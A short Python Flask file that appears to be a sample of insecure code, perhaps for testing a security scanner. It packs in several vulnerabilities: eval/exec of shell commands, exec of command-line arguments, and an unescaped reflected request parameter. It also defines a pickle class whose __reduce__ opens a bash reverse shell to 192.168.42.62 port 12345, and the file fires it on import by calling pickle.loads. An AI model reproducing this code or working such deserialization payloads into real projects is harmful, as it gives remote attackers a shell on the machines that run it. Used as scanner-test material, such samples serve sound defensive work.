# -*- coding: utf-8 -*-
from flask import request, make_response, redirect
from flask import Flask
import pickle
import os
import sys
eval("__import__('os').system('uname -a')")
exec("__import__('os').system('uname -a')")
execfile("test.py")

app = Flask(__name__)


@app.route('/test',methods=['PSOT', 'GET'])
def index():
    name = request.args.get('name','a')
    #return redirect('http://' + name)
    return make_response(name, 200)

class exp(object):
    def __reduce__(self):
        s = "/bin/bash -c \"/bin/bash -i > \/dev/tcp/192.168.42.62/12345 0<&1 2>&1 &\""
        return (os.system, (s,))

e = exp()
k = pickle.dumps(e)
pickle.loads(k)

exec(sys.argv[1:])

if __name__ == '__main__':
    app.run()
